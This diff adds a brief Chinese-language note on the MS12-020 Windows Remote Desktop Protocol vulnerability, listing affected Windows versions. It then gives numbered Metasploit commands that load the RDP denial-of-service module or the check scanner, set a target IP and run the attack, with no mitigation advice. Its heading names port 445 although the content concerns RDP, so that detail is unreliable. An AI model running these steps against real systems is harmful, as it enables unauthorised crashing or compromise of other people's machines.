@@ -1,0 +1,20 @@
+445端口
+Microsoft Windows操作系统是目前使用最广泛的操作系统之一，其远程桌面协议（Remote Desktop Protocol）被广泛用于用户远程管理计算机。近期在Windows操作系统的远程桌面协议中（Remote Desktop Protocol）被发现存在一个远程代码可执行漏洞。
+ 
+在Windows XP *、Windows Server 2003 *以及未开启网络层认证（Network Level Authentication）的Windows Vista *、Windows Server 2008 *和Windows 7 *中，只要操作系统开启Remote Desktop Protocol (RDP)服务，远程攻击者在未经认证的情况下往服务器发送畸形恶意的数据包，便可以以系统权限或者NET SERVICE权限执行任意命令。
+ 
+在开启网络层认证（Network Level Authentication）的Windows Vista *、Windows Server 2008 *和Windows 7 *中，远程攻击者需要以合法账户登录，才能发动攻击，远程执行任意命令。
+
+
+
+
+
+打开cmder
+msfconsole
+1.search ms12-020
+2.use  auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+use  auxiliary/scanner/rdp/ms12_020_check
+3.set rhost  ip地址
+4.exploit
+
+run
